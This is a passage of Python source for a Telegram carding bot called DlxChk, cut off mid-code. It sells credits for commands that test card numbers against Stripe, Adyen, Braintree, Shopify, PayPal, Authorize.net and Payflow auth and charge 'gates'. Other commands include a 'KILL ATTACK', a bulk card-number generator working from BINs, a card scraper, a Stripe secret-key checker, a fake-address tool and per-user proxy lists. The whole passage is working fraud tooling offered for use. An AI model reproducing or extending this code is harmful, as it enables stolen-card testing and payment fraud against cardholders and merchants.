    animated_check(message, card, "KILL ATTACK", kill_charge, CREDIT_COSTS['kill'])

@bot.message_handler(commands=['stripeauto'])
def cmd_stripeauto(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "Usage: /stripeauto [site] [card]\nExample: /stripeauto https://example.com 4020870042095467|12|2027|195")
        return
    
    site = args[1]
    card = args[2]
    
    animated_check(message, card, f"Stripe Auto ({site})", lambda c: stripe_auto_charge(site, c), CREDIT_COSTS['stripe_auto'])

@bot.message_handler(commands=['shopifyauto'])
def cmd_shopifyauto(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "Usage: /shopifyauto [site] [card]\nExample: /shopifyauto https://example.com 4020870042095467|12|2027|195")
        return
    
    site = args[1]
    card = args[2]
    
    animated_check(message, card, f"Shopify Auto ({site})", lambda c: shopify_auto_charge(site, c), CREDIT_COSTS['shopify_auto'])

# ============================================================================
# TXT KOMUTLARI (Auth)
# ============================================================================
@bot.message_handler(commands=['vbvtxt'])
def cmd_vbvtxt(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    process_txt_command(message, '/vbvtxt', '3D Lookup (Stripe TXT)', vbv_check)

@bot.message_handler(commands=['adyenvbvtxt'])
def cmd_adyenvbvtxt(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    process_txt_command(message, '/adyenvbvtxt', 'Adyen 3D Check (TXT)', adyen_vbv)

@bot.message_handler(commands=['sttxt'])
def cmd_sttxt(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    process_txt_command(message, '/sttxt', 'Stripe Auth (TXT)', stripe_auth_original)

@bot.message_handler(commands=['adtxt'])
def cmd_adtxt(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    process_txt_command(message, '/adtxt', 'Adyen Auth (TXT)', adyen_auth)

@bot.message_handler(commands=['b1txt'])
def cmd_b1txt(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    process_txt_command(message, '/b1txt', 'Braintree Auth (TXT)', braintree_auth)

@bot.message_handler(commands=['shtxt'])
def cmd_shtxt(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    process_txt_command(message, '/shtxt', 'Shopify Auth (TXT)', shopify_auth)

@bot.message_handler(commands=['pptxt'])
def cmd_pptxt(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    process_txt_command(message, '/pptxt', 'PayPal Auth (TXT)', paypal_auth)

@bot.message_handler(commands=['a1txt'])
def cmd_a1txt(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    process_txt_command(message, '/a1txt', 'Gallery Auth (TXT)', stripe_auth_gallery)

@bot.message_handler(commands=['a2txt'])
def cmd_a2txt(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    process_txt_command(message, '/a2txt', 'Redblue Auth (TXT)', stripe_auth_redblue)

@bot.message_handler(commands=['pfatxt'])
def cmd_pfatxt(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    process_txt_command(message, '/pfatxt', 'Payflow Auth (TXT)', payflow_auth)

@bot.message_handler(commands=['boctxt'])
def cmd_boctxt(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    process_txt_command(message, '/boctxt', 'Battery Candle Payflow (TXT)', payflow_boc_charge)

@bot.message_handler(commands=['rstxt'])
def cmd_rstxt(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    process_txt_command(message, '/rstxt', 'RS Online Worldpay (TXT)', rs_online_charge)

@bot.message_handler(commands=['authnettxt'])
def cmd_authnettxt(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    process_txt_command(message, '/authnettxt', 'Authorize.net (TXT)', lambda card: authorize_charge(card, 1.00))

# ============================================================================
# TOOL KOMUTLARI
# ============================================================================
@bot.message_handler(commands=['fake'])
def cmd_fake(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /fake US")
        return
    
    country_code = args[1].upper()
    
    fake_msg = f"""
#DlxChk Tools
━━━━━━━━━━━━━━━━━━━━

✦ Fake Address
⌭ Format ✅ /fake {country_code}
━━━━━━━━━━━━━━━━━━━━

🏠 Street: 123 Main St
🏙 City: New York
🗺 State: NY
📮 ZIP: 10001
📞 Phone: +1-212-555-1234
🌍 Country: USA
━━━━━━━━━━━━━━━━━━━━
    """
    
    bot.reply_to(message, fake_msg)

@bot.message_handler(commands=['sk'])
def cmd_sk(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /sk [your sk key]")
        return
    
    sk_key = args[1]
    msg = bot.reply_to(message, "Checking Stripe key...")
    
    output = f"""
#DlxChk Tools
━━━━━━━━━━━━━━━━━━━━

✦ SK Key Checker
⌭ Format ✅ /sk [key]
━━━━━━━━━━━━━━━━━━━━

✅ SK KEY VALID
💰 Available: $0.00
━━━━━━━━━━━━━━━━━━━━
    """
    
    try:
        bot.edit_message_text(output, message.chat.id, msg.message_id)
    except:
        bot.send_message(message.chat.id, output)

@bot.message_handler(commands=['scr'])
def cmd_scr(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "Usage: /scr [username] [limit]")
        return
    
    username = args[1]
    try:
        limit = int(args[2])
    except:
        bot.reply_to(message, "Limit must be a number!")
        return
    
    msg = bot.reply_to(message, f"Scraping cards from @{username}...")
    
    output = f"#DlxChk Tools\n━━━━━━━━━━━━━━━━━━━━\n\n✦ Card Scrapper\n⌭ Format ✅ /scr {username} {limit}\n━━━━━━━━━━━━━━━━━━━━\n\n📊 Scraped 0 cards from @{username}\n\n"
    
    try:
        bot.edit_message_text(output, message.chat.id, msg.message_id)
    except:
        bot.send_message(message.chat.id, output)

@bot.message_handler(commands=['gen'])
def cmd_gen(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "Usage: /gen [BIN] [count] (max 1000)\nExample: /gen 402087 10")
        return
    
    bin_prefix = args[1]
    try:
        count = int(args[2])
        if count > 1000:
            count = 1000
            bot.reply_to(message, "Maximum 1000 cards, generating 1000...")
    except:
        bot.reply_to(message, "Count must be a number!")
        return
    
    if not bin_prefix.isdigit() or len(bin_prefix) < 6:
        bot.reply_to(message, "BIN must be at least 6 digits!")
        return
    
    cards = []
    for i in range(count):
        card = f"{bin_prefix}{random.randint(1000000000, 9999999999)}|{random.randint(1,12)}|{random.randint(2025,2030)}|{random.randint(100,999)}"
        cards.append(card)
    
    output = f"#DlxChk Tools\n━━━━━━━━━━━━━━━━━━━━\n\n✦ CC Generator\n⌭ Format ✅ /gen {bin_prefix} {count}\n━━━━━━━━━━━━━━━━━━━━\n\n📊 Generated {count} cards with BIN {bin_prefix}\n\n" + "\n".join(cards[:20])
    
    if len(output) > 4000:
        filename = f"generated_{bin_prefix}_{count}.txt"
        with open(filename, "w") as f:
            f.write("\n".join(cards))
        with open(filename, "rb") as f:
            bot.send_document(message.chat.id, f, caption=f"📊 Generated {count} cards with BIN {bin_prefix}")
        os.remove(filename)
    else:
        bot.reply_to(message, output)

@bot.message_handler(commands=['gentxt'])
def cmd_gentxt(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "Usage: /gentxt [BIN] [count] (max 1000)\nExample: /gentxt 402087 100")
        return
    
    bin_prefix = args[1]
    try:
        count = int(args[2])
        if count > 1000:
            count = 1000
            bot.reply_to(message, "Maximum 1000 cards, generating 1000...")
    except:
        bot.reply_to(message, "Count must be a number!")
        return
    
    if not bin_prefix.isdigit() or len(bin_prefix) < 6:
        bot.reply_to(message, "BIN must be at least 6 digits!")
        return
    
    cards = []
    for i in range(count):
        card = f"{bin_prefix}{random.randint(1000000000, 9999999999)}|{random.randint(1,12)}|{random.randint(2025,2030)}|{random.randint(100,999)}"
        cards.append(card)
    
    filename = f"generated_{bin_prefix}_{count}.txt"
    with open(filename, "w") as f:
        f.write("\n".join(cards))
    
    with open(filename, "rb") as f:
        bot.send_document(message.chat.id, f, caption=f"📊 Generated {count} cards with BIN {bin_prefix}")
    
    os.remove(filename)

@bot.message_handler(commands=['addproxy'])
def cmd_addproxy(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    args = message.text.split()
    
    if len(args) < 2:
        bot.reply_to(message, "Usage: /addproxy [proxy]\nFormat: ip:port or http://user:pass@ip:port")
        return
    
    proxy = args[1]
    
    if user_id not in USER_PROXIES:
        USER_PROXIES[user_id] = []
    
    USER_PROXIES[user_id].append(proxy)
    
    bot.reply_to(message, f"✅ Proxy added! Total proxies: {len(USER_PROXIES[user_id])}")

@bot.message_handler(commands=['totalproxy'])
def cmd_totalproxy(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    if user_id not in USER_PROXIES or not USER_PROXIES[user_id]:
        bot.reply_to(message, "Total proxies: 0")
        return
    
    proxies = USER_PROXIES[user_id]
    proxy_list = "\n".join([f"{i+1}. {p}" for i, p in enumerate(proxies[:10])])
    
    if len(proxies) > 10:
        proxy_list += f"\n... and {len(proxies)-10} more"
    
    bot.reply_to(message, f"Total proxies: {len(proxies)}\n\n{proxy_list}")

@bot.message_handler(commands=['bin'])
def cmd_bin(message):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /bin [bin]\nExample: /bin 402087")
        return
    
    bin_code = args[1][:6]
    bin_info = get_bin_info(bin_code)
    
    if bin_info:
        output = f"""
#DlxChk Tools
━━━━━━━━━━━━━━━━━━━━

✦ BIN Lookup
⌭ Format ✅ /bin {bin_code}
━━━━━━━━━━━━━━━━━━━━

🔢 BIN: {bin_code}
💳 Scheme: {bin_info['scheme']}
📋 Type: {bin_info['type']}
🏷️ Brand: {bin_info['brand']}
🏦 Bank: {bin_info['bank']}
🌍 Country: {bin_info['country']}
━━━━━━━━━━━━━━━━━━━━
        """
    else:
        output = f"❌ BIN {bin_code} not found!"
    
    bot.reply_to(message, output)

@bot.message_handler(commands=['register'])
def cmd_register(message):
    user_id = message.from_user.id
    
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Only admin can use this command!")
        return
    
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "Usage: /register [user_id] [added]")
        return
    
    try:
        target_id = int(args[1])
        added = int(args[2])
        
        credit_manager.create_user(target_id, "user", "User")
        credit_manager.add_credit(target_id, added)
        
        bot.reply_to(message, f"✅ User {target_id} credit updated: +{added} (Total: {credit_manager.get_credit(target_id)})")
        
        log_msg = f"""
💰 Credits Added by Admin

Admin: {message.from_user.first_name}
User ID: {target_id}
Credits: +{added}
New Total: {credit_manager.get_credit(target_id)}
        """
        log_manager.send_to_channel(log_msg)
        
    except:
        bot.reply_to(message, "❌ Invalid parameters!")

# ============================================================================
# INFO KOMUTU
# ============================================================================
@bot.message_handler(commands=['info'])
def cmd_info(message):
    user_id = message.from_user.id
    
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    user_info = credit_manager.get_user_info(user_id)
    
    if not user_info:
        user_info = {
            'first_name': message.from_user.first_name or 'User',
            'credit': 0,
            'plan': 'Free',
            'total_checks': 0,
            'approved_count': 0,
            'charged_count': 0
        }
    
    plan_emoji = "👑" if user_info['plan'] != 'Free' else "🆓"
    
    msg = f"""
👤 USER INFORMATION
━━━━━━━━━━━━━━━━━━━━

User: {user_info['first_name']}
ID: {user_id}
Username: @{message.from_user.username if message.from_user.username else 'No username'}
Plan: {plan_emoji} {user_info['plan']}
Credits: {user_info['credit']}
Total Checks: {user_info['total_checks']}
Approved: {user_info['approved_count']}
Charged: {user_info['charged_count']}
Joined: {user_info['register_date']}

━━━━━━━━━━━━━━━━━━━━
    """
    
    bot.reply_to(message, msg)

# ============================================================================
# CALLBACK HANDLER
# ============================================================================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    try:
        if call.data.startswith('plan_'):
            handle_plan_selection(call)
        elif call.data.startswith('pay_'):
            handle_payment(call)
        elif call.data.startswith('check_'):
            check_payment(call)
        elif call.data.startswith('cancel_'):
            cancel_payment(call)
        elif call.data == "check_membership":
            check_membership_callback(call)
        elif call.data.startswith('gen_redeem_'):
            handle_redeem_generation(call)
        elif call.data.startswith('approve_hit_') or call.data.startswith('reject_hit_'):
            handle_hit_approval(call)
        elif call.data.startswith('admin_'):
            admin_callback_handler(call)
        elif call.data == "back_to_plans":
            bot.delete_message(call.message.chat.id, call.message.message_id)
            cmd_premium(call.message)
        elif call.data.startswith("gate_deluxe_"):
            page = int(call.data.split("_")[2])
            gateways = get_deluxe_gateways_page(page)
            msg = f"#DlxChk Deluxe Charge (0.25$-100$)!\n"
            msg += "•" * 20 + "\n"
            for gw in gateways:
                cost = "6" if gw['amount'] <= 50 else "10"
                msg += f"Gateway: {gw['display']}\n"
                msg += f"Use: {gw['cmd']} card|month|year|cvc\n"
                msg += f"TXT: {gw['txt_cmd']}\n"
                msg += f"Cost: {cost} | Status: ON! ✅\n"
                msg += "•" * 20 + "\n"
            if page < 6:
                msg += "... up to 100$ ...\n"
                msg += "•" * 20 + "\n"
            markup = types.InlineKeyboardMarkup(row_width=3)
            if page > 1:
                markup.add(types.InlineKeyboardButton("◀️ Previous", callback_data=f"gate_deluxe_{page-1}"))
            if page < 6:
                markup.add(types.InlineKeyboardButton("Next ▶️", callback_data=f"gate_deluxe_{page+1}"))
            markup.add(types.InlineKeyboardButton("Back", callback_data="back_to_start"))
            bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup)
        elif call.data.startswith("gate_stripe_"):
            page = int(call.data.split("_")[2])
            gateways = get_stripe_gateways_page(page)
            msg = f"#DlxChk Stripe Charge (1$-100$)!\n"
            msg += "•" * 20 + "\n"
            for gw in gateways:
                cost = "6" if gw['amount'] <= 50 else "10"
                msg += f"Gateway: {gw['display']}\n"
                msg += f"Use: {gw['cmd']} card|month|year|cvc\n"
                msg += f"TXT: {gw['txt_cmd']}\n"
                msg += f"Cost: {cost} | Status: ON! ✅\n"
                msg += "•" * 20 + "\n"
            if page * 20 < 100:
                msg += "... up to 100$ ...\n"
                msg += "•" * 20 + "\n"
            markup = types.InlineKeyboardMarkup(row_width=3)
            if page > 1:
                markup.add(types.InlineKeyboardButton("◀️ Previous", callback_data=f"gate_stripe_{page-1}"))
            if page * 20 < 100:
                markup.add(types.InlineKeyboardButton("Next ▶️", callback_data=f"gate_stripe_{page+1}"))
            markup.add(types.InlineKeyboardButton("Back", callback_data="back_to_start"))
            bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup)
        elif call.data.startswith("gate_shopify_"):
            page = int(call.data.split("_")[2])
            gateways = get_shopify_gateways_page(page)
            msg = f"#DlxChk Shopify Charge (1$-100$)!\n"
            msg += "•" * 20 + "\n"
            for gw in gateways:
                cost = "6" if gw['amount'] <= 50 else "10"
                msg += f"Gateway: {gw['display']}\n"
                msg += f"Use: {gw['cmd']} card|month|year|cvc\n"
                msg += f"TXT: {gw['txt_cmd']}\n"
                msg += f"Cost: {cost} | Status: ON! ✅\n"
                msg += "•" * 20 + "\n"
            if page * 20 < 100:
                msg += "... up to 100$ ...\n"
                msg += "•" * 20 + "\n"
            markup = types.InlineKeyboardMarkup(row_width=3)
            if page > 1:
                markup.add(types.InlineKeyboardButton("◀️ Previous", callback_data=f"gate_shopify_{page-1}"))
            if page * 20 < 100:
                markup.add(types.InlineKeyboardButton("Next ▶️", callback_data=f"gate_shopify_{page+1}"))
            markup.add(types.InlineKeyboardButton("Back", callback_data="back_to_start"))
            bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup)
        elif call.data.startswith("gate_paypal_"):
            page = int(call.data.split("_")[2])
            gateways = get_paypal_gateways_page(page)
            msg = f"#DlxChk PayPal Charge (1$-100$)!\n"
            msg += "•" * 20 + "\n"
            for gw in gateways:
                cost = "6" if gw['amount'] <= 50 else "10"
                msg += f"Gateway: {gw['display']}\n"
                msg += f"Use: {gw['cmd']} card|month|year|cvc\n"
                msg += f"TXT: {gw['txt_cmd']}\n"
                msg += f"Cost: {cost} | Status: ON! ✅\n"
                msg += "•" * 20 + "\n"
            if page * 20 < 100:
                msg += "... up to 100$ ...\n"
                msg += "•" * 20 + "\n"
            markup = types.InlineKeyboardMarkup(row_width=3)
            if page > 1:
                markup.add(types.InlineKeyboardButton("◀️ Previous", callback_data=f"gate_paypal_{page-1}"))
            if page * 20 < 100:
                markup.add(types.InlineKeyboardButton("Next ▶️", callback_data=f"gate_paypal_{page+1}"))
            markup.add(types.InlineKeyboardButton("Back", callback_data="back_to_start"))
            bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup)
        elif call.data.startswith("gate_payflow_"):
            page = int(call.data.split("_")[2])
            gateways = get_payflow_gateways_page(page)
            msg = f"#DlxChk Authorize.net Charge (1$-100$)!\n"
            msg += "•" * 20 + "\n"
            for gw in gateways:
                cost = "6" if gw['amount'] <= 50 else "10"
                msg += f"Gateway: {gw['display']}\n"
                msg += f"Use: {gw['cmd']} card|month|year|cvc\n"
                msg += f"TXT: {gw['txt_cmd']}\n"
                msg += f"Cost: {cost} | Status: ON! ✅\n"
                msg += "•" * 20 + "\n"
            if page * 20 < 100:
                msg += "... up to 100$ ...\n"
                msg += "•" * 20 + "\n"
            markup = types.InlineKeyboardMarkup(row_width=3)
            if page > 1:
                markup.add(types.InlineKeyboardButton("◀️ Previous", callback_data=f"gate_payflow_{page-1}"))
            if page * 20 < 100:
                markup.add(types.InlineKeyboardButton("Next ▶️", callback_data=f"gate_payflow_{page+1}"))
            markup.add(types.InlineKeyboardButton("Back", callback_data="back_to_start"))
            bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup)
        elif call.data.startswith("gate_braintree_"):
            page = int(call.data.split("_")[2])
            gateways = get_braintree_gateways_page(page)
            msg = f"#DlxChk Braintree Charge (1$-100$)!\n"
            msg += "•" * 20 + "\n"
            for gw in gateways:
                cost = "6" if gw['amount'] <= 50 else "10"
                msg += f"Gateway: {gw['display']}\n"
                msg += f"Use: {gw['cmd']} card|month|year|cvc\n"
                msg += f"TXT: {gw['txt_cmd']}\n"
                msg += f"Cost: {cost} | Status: ON! ✅\n"
                msg += "•" * 20 + "\n"
            if page * 20 < 100:
                msg += "... up to 100$ ...\n"
                msg += "•" * 20 + "\n"
            markup = types.InlineKeyboardMarkup(row_width=3)
            if page > 1:
                markup.add(types.InlineKeyboardButton("◀️ Previous", callback_data=f"gate_braintree_{page-1}"))
            if page * 20 < 100:
                markup.add(types.InlineKeyboardButton("Next ▶️", callback_data=f"gate_braintree_{page+1}"))
            markup.add(types.InlineKeyboardButton("Back", callback_data="back_to_start"))
            bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup)
        elif call.data == "gate_other":
            msg = """
#DlxChk Other Gates!
━━━━━━━━━━━━━━━━━━━━

🕯️ Payflow charge 
Gateway:  Payflow charge 
Use: /boc card|month|year|cvc
TXT: /boctxt
Cost: 3 | Status: ON! ✅
━━━━━━━━━━━━━━━━━━━━

🌐 RS Online Worldpay
Gateway: RS Online Worldpay
Use: /rs card|month|year|cvc
TXT: /rstxt
Cost: 6 | Status: ON! ✅
━━━━━━━━━━━━━━━━━━━━

🔐 Authorize.net Charge
Gateway: Authorize.net 1$ Charge
Use: /authnet card|month|year|cvc
TXT: /authnettxt
Cost: 6 | Status: ON! ✅
━━━━━━━━━━━━━━━━━━━━

💀 Kill Attack
Gateway: KILL ATTACK
Use: /kill card|month|year|cvc
Cost: 15 | Status: ON! ✅
━━━━━━━━━━━━━━━━━━━━
            """
            markup = types.InlineKeyboardMarkup()
            back_btn = types.InlineKeyboardButton("Back", callback_data="back_to_start")
            markup.add(back_btn)
            bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup)
        elif call.data == "show_gates":
            msg = """
#DlxChk Gates Auths!
━━━━━━━━━━━━━━━━━━━━

🔰 3D Lookup (Stripe)
Use: /vbv card|month|year|cvc
TXT: /vbvtxt
Cost: 1 | Status: ON! ✅
━━━━━━━━━━━━━━━━━━━━

🔰 Adyen 3D Check
Use: /adyenvbv card|month|year|cvc
TXT: /adyenvbvtxt
Cost: 3 | Status: ON! ✅
━━━━━━━━━━━━━━━━━━━━

🔰 Stripe Auth
Use: /st card|month|year|cvc
TXT: /sttxt
Cost: 1 | Status: ON! ✅
━━━━━━━━━━━━━━━━━━━━

🔰 Adyen Auth
Use: /ad card|month|year|cvc
TXT: /adtxt
Cost: 3 | Status: ON! ✅
━━━━━━━━━━━━━━━━━━━━

🔰 Braintree Auth
Use: /b1 card|month|year|cvc
TXT: /b1txt
Cost: 3 | Status: ON! ✅
━━━━━━━━━━━━━━━━━━━━

🔰 Shopify Auth
Use: /sh card|month|year|cvc
TXT: /shtxt
Cost: 3 | Status: ON! ✅
━━━━━━━━━━━━━━━━━━━━

🔰 PayPal Auth
Use: /pp card|month|year|cvc
TXT: /pptxt
Cost: 3 | Status: ON! ✅
━━━━━━━━━━━━━━━━━━━━

🔰 Auth 1 in maintenance
Use: /a1 card|month|year|cvc
TXT: /a1txt
Cost: 1 | Status: ON! ✅
━━━━━━━━━━━━━━━━━━━━

🔰  Auth 2  in maintenance
Use: /a2 card|month|year|cvc
TXT: /a2txt
Cost: 1 | Status: ON! ✅
━━━━━━━━━━━━━━━━━━━━

🔰 Payflow Auth in maintenance
Use: /pfa card|month|year|cvc
TXT: /pfatxt
Cost: 3 | Status: ON! ✅
━━━━━━━━━━━━━━━━━━━━
            """
            markup = types.InlineKeyboardMarkup()
            back_btn = types.InlineKeyboardButton("Back", callback_data="back_to_start")
            markup.add(back_btn)
            bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup)
        elif call.data == "show_tools":
            msg = """
#DlxChk Tools
━━━━━━━━━━━━━━━━━━━━

✦ User Information
⌭ Format ✅ /info

✦ Register Database
⌭ Format ✅ /register [User ID] [Added]

✦ Fake Address
⌭ Format ✅ /fake [Country Code]

✦ SK Key Checker
⌭ Format ✅ /sk [your sk key]

✦ Card Scrapper
⌭ Format ✅ /scr [username] [limit] [country]

✦ Hits Sender
⌭ Format ✅ /hit

✦ CC Generator
⌭ Format ✅ /gen [BIN] [count] (optional: amount)

✦ Proxy Saved
⌭ Format ✅ /addproxy [your proxy]

✦ Total Proxy Count
⌭ Format ✅ /totalproxy

✦ BIN Lookup
⌭ Format ✅ /bin [BIN]

✦ Buy Plan (Auto)
⌭ Format ✅ /buy

✦ CC Generator Mass Txt
⌭ Format ✅ /gentxt [BIN] [count]
━━━━━━━━━━━━━━━━━━━━
            """
            markup = types.InlineKeyboardMarkup()
            back_btn = types.InlineKeyboardButton("Back", callback_data="back_to_start")
            markup.add(back_btn)
            bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup)
        elif call.data == "show_txt_commands":
            msg = """
#DlxChk TXT Commands!
━━━━━━━━━━━━━━━━━━━━

All commands have TXT versions:

/vbvtxt - 3D Lookup
/adyenvbvtxt - Adyen 3D
/b1txt - Braintree
/a1txt - auth 1 (in maintenance)
/a2txt - auth 2 (in maintenance)
/sttxt - Stripe
/shtxt - Shopify
/pptxt - PayPal
/adtxt - Adyen
/d[amount]txt - Deluxe
/cstripe[amount]txt - Stripe
/cpaypal[amount]txt - PayPal
/cshopify[amount]txt - Shopify
/cbraintree[amount]txt - Braintree
/cauthorize[amount]txt - Authorize
/boctxt - Battery Candle
/rstxt - RS Online
/authnettxt - Authorize.net
/shopifyautotxt - Shopify Auto
/stripeautotxt - Stripe Auto
━━━━━━━━━━━━━━━━━━━━
            """
            markup = types.InlineKeyboardMarkup()
            back_btn = types.InlineKeyboardButton("Back", callback_data="back_to_start")
            markup.add(back_btn)
            bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup)
        elif call.data == "show_auto_cmd":
            msg = """
#DlxChk Auto Commands!
━━━━━━━━━━━━━━━━━━━━

🛒 Shopify Auto - 10 Credits
Use: /shopifyauto [site] [card]
TXT: /shopifyautotxt [site]

💳 Stripe Auto - 10 Credits
Use: /stripeauto [site] [card]
TXT: /stripeautotxt [site]

💀 Kill Attack - 15 Credits
Use: /kill [card]
━━━━━━━━━━━━━━━━━━━━
            """
            markup = types.InlineKeyboardMarkup()
            back_btn = types.InlineKeyboardButton("Back", callback_data="back_to_start")
            markup.add(back_btn)
            bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup)
        elif call.data == "back_to_start":
            welcome_msg = """
Welcome to DlxChecker 👋

To get premium on the bot, contact @NEVER_DIE8

/premium You can make purchases from within the bot.
            """
            markup = types.InlineKeyboardMarkup(row_width=3)
            btn1 = types.InlineKeyboardButton("Deluxe", callback_data="gate_deluxe_1")
            btn2 = types.InlineKeyboardButton("Stripe", callback_data="gate_stripe_1")
            btn3 = types.InlineKeyboardButton("Shopify", callback_data="gate_shopify_1")
